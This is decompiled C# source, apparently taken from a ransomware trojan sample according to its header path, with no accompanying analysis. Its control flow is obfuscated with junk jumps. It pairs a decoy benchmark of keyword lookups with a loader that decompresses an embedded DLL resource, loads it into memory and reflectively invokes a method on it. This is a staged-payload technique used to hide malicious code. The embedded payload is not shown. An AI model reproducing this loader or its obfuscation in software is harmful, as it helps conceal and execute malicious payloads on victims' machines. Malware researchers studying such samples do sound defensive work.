// Decompiled with JetBrains decompiler
// Type: Yntmgnmjwxmbnwlr.i
// Assembly: ConsoleApp2, Version=92.0.4515.159, Culture=neutral, PublicKeyToken=null
// MVID: D38653D3-F867-445C-918F-B56DE6FC8054
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.09-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-05c81dca5026782b10339282d62291ee4153d1e4952c6062be97481849ac1d2a.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;

namespace Yntmgnmjwxmbnwlr
{
  public sealed class i
  {
    private static readonly string[] a;
    private static readonly HashSet<string> b;

    public i()
    {
      if (true)
        ;
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    static i()
    {
      string[] strArray = new string[77]
      {
        "abstract",
        "event",
        "new",
        "struct",
        "as",
        "explicit",
        "null",
        "switch",
        "base",
        "extern",
        "object",
        "this",
        "bool",
        "false",
        "operator",
        "throw",
        "break",
        "finally",
        "out",
        "true",
        "byte",
        "fixed",
        "override",
        "try",
        "case",
        "float",
        "params",
        "typeof",
        "catch",
        "for",
        "private",
        "uint",
        "char",
        "foreach",
        "protected",
        "ulong",
        "checked",
        "goto",
        "public",
        "unchecked",
        "class",
        "if",
        "readonly",
        "unsafe",
        "const",
        "implicit",
        "ref",
        "ushort",
        "continue",
        "in",
        "return",
        "using",
        "decimal",
        "int",
        "sbyte",
        "virtual",
        "default",
        "interface",
        "sealed",
        "volatile",
        "delegate",
        "internal",
        "short",
        "void",
        "do",
        "is",
        "sizeof",
        "while",
        "double",
        "lock",
        "stackalloc",
        "else",
        "long",
        "static",
        "enum",
        "namespace",
        "string"
      };
      if (true)
        goto label_3;
label_1:
      HashSet<string> stringSet = new HashSet<string>();
      stringSet.Add("abstract");
      stringSet.Add("event");
      stringSet.Add("new");
      stringSet.Add("struct");
      stringSet.Add("as");
      stringSet.Add("explicit");
      stringSet.Add("null");
      stringSet.Add("switch");
      stringSet.Add("base");
      stringSet.Add("extern");
      stringSet.Add("object");
      stringSet.Add("this");
      stringSet.Add("bool");
      stringSet.Add("false");
      stringSet.Add("operator");
      stringSet.Add("throw");
      stringSet.Add("break");
      stringSet.Add("finally");
      stringSet.Add("out");
      stringSet.Add("true");
      stringSet.Add("byte");
      stringSet.Add("fixed");
      stringSet.Add("override");
      stringSet.Add("try");
      stringSet.Add("case");
      stringSet.Add("float");
      stringSet.Add("params");
      stringSet.Add("typeof");
      stringSet.Add("catch");
      stringSet.Add("for");
      stringSet.Add("private");
      stringSet.Add("uint");
      stringSet.Add("char");
      stringSet.Add("foreach");
      stringSet.Add("protected");
      stringSet.Add("ulong");
      stringSet.Add("checked");
      stringSet.Add("goto");
      stringSet.Add("public");
      stringSet.Add("unchecked");
      stringSet.Add("class");
      stringSet.Add("if");
      stringSet.Add("readonly");
      stringSet.Add("unsafe");
      stringSet.Add("const");
      stringSet.Add("implicit");
      stringSet.Add("ref");
      stringSet.Add("ushort");
      stringSet.Add("continue");
      stringSet.Add("in");
      stringSet.Add("return");
      stringSet.Add("using");
      stringSet.Add("decimal");
      stringSet.Add("int");
      stringSet.Add("sbyte");
      stringSet.Add("virtual");
      stringSet.Add("default");
      stringSet.Add("interface");
      stringSet.Add("sealed");
      stringSet.Add("volatile");
      stringSet.Add("delegate");
      stringSet.Add("internal");
      stringSet.Add("short");
      stringSet.Add("void");
      stringSet.Add("do");
      stringSet.Add("is");
      stringSet.Add("sizeof");
      stringSet.Add("while");
      stringSet.Add("double");
      stringSet.Add("lock");
      stringSet.Add("stackalloc");
      stringSet.Add("else");
      stringSet.Add("long");
      stringSet.Add("static");
      stringSet.Add("enum");
      stringSet.Add("namespace");
      stringSet.Add("string");
      if (false)
        return;
      i.b = stringSet;
      return;
label_3:
      i.a = strArray;
      goto label_1;
    }

    private static byte[] a(byte[] a)
    {
      if (a == null)
        return (byte[]) null;
      MemoryStream memoryStream1 = new MemoryStream(a);
      MemoryStream memoryStream2;
      if (true)
        memoryStream2 = memoryStream1;
      try
      {
        MemoryStream memoryStream3 = new MemoryStream();
        MemoryStream destination;
        if (true)
          destination = memoryStream3;
        try
        {
          BufferedStream bufferedStream1 = new BufferedStream((Stream) new GZipStream((Stream) memoryStream2, CompressionMode.Decompress));
          BufferedStream bufferedStream2;
          if (true)
            bufferedStream2 = bufferedStream1;
          try
          {
            bufferedStream2.CopyTo((Stream) destination);
          }
          finally
          {
            bufferedStream2.Dispose();
          }
          return destination.ToArray();
        }
        finally
        {
          destination.Dispose();
        }
      }
      finally
      {
        memoryStream2.Dispose();
      }
    }

    private static Assembly a()
    {
      MemoryStream memoryStream = new MemoryStream();
      MemoryStream destination;
      if (true)
        destination = memoryStream;
      Assembly assembly1;
      try
      {
        if (true)
          goto label_4;
label_3:
        string name;
        Assembly.GetExecutingAssembly().GetManifestResourceStream(name).CopyTo((Stream) destination);
        Assembly assembly2 = AppDomain.CurrentDomain.Load(i.a(destination.ToArray()));
        if (true)
        {
          assembly1 = assembly2;
          goto label_7;
        }
        else
          goto label_7;
label_4:
        name = "Yntmgnmjwxmbnwlr.Qibmuipkkozm.dll";
        goto label_3;
      }
      finally
      {
        destination.Dispose();
      }
label_7:
      return assembly1;
    }

    public static string a()
    {
      Type[] exportedTypes = i.a().GetExportedTypes();
      if (true)
        goto label_2;
label_1:
      int index;
      if (true)
        index = 0;
      Type[] typeArray;
      for (; index < typeArray.Length; ++index)
      {
        Type type1 = typeArray[index];
        if (true)
          goto label_6;
label_5:
        Type type2;
        if (type2.FullName == "Qibmuipkkozm.ClassLibrary")
        {
          object instance = Activator.CreateInstance(type2);
          return type2.InvokeMember("Data", BindingFlags.InvokeMethod, (Binder) null, instance, (object[]) null) as string;
        }
        continue;
label_6:
        type2 = type1;
        goto label_5;
      }
      return "";
label_2:
      typeArray = exportedTypes;
      goto label_1;
    }

    public static void a()
    {
      string[] strArray1 = "This is a short test string that will show the typeof behavior expected".Split(' ');
      if (true)
        goto label_6;
label_1:
      Stopwatch stopwatch1 = new Stopwatch();
      if (true)
        goto label_7;
label_2:
      Stopwatch stopwatch2 = new Stopwatch();
      if (true)
        goto label_8;
label_3:
      if (true)
        goto label_9;
label_4:
      if (true)
        goto label_10;
label_5:
      string[] strArray2;
      for (int index1 = 0; index1 < 100; ++index1)
      {
        for (int index2 = 0; index2 < strArray2.Length; ++index2)
        {
          string str = strArray2[index2];
          i.b.Contains(str);
        }
        for (int index3 = 0; index3 < strArray2.Length; ++index3)
        {
          string str = strArray2[index3];
          ((IEnumerable<string>) i.a).Contains<string>(str);
        }
      }
      Stopwatch stopwatch3;
      stopwatch3.Start();
      int num1;
      for (int index4 = 0; index4 < 500000; ++index4)
      {
        for (int index5 = 0; index5 < strArray2.Length; ++index5)
        {
          string str = strArray2[index5];
          if (((IEnumerable<string>) i.a).Contains<string>(str))
            ++num1;
        }
      }
      stopwatch3.Stop();
      Stopwatch stopwatch4;
      stopwatch4.Start();
      int num2;
      for (int index6 = 0; index6 < 500000; ++index6)
      {
        for (int index7 = 0; index7 < strArray2.Length; ++index7)
        {
          string str = strArray2[index7];
          if (i.b.Contains(str))
            ++num2;
        }
      }
      stopwatch4.Stop();
      Console.WriteLine(string.Format("Array: {0} iterations, {1} matches, {2} ms", (object) 500000, (object) num1, (object) stopwatch3.ElapsedMilliseconds));
      Console.WriteLine(string.Format("HashSet: {0} iterations, {1} matches, {2} ms", (object) 500000, (object) num2, (object) stopwatch4.ElapsedMilliseconds));
      return;
label_10:
      num2 = 0;
      goto label_5;
label_9:
      num1 = 0;
      goto label_4;
label_8:
      stopwatch4 = stopwatch2;
      goto label_3;
label_7:
      stopwatch3 = stopwatch1;
      goto label_2;
label_6:
      strArray2 = strArray1;
      goto label_1;
    }
  }
}
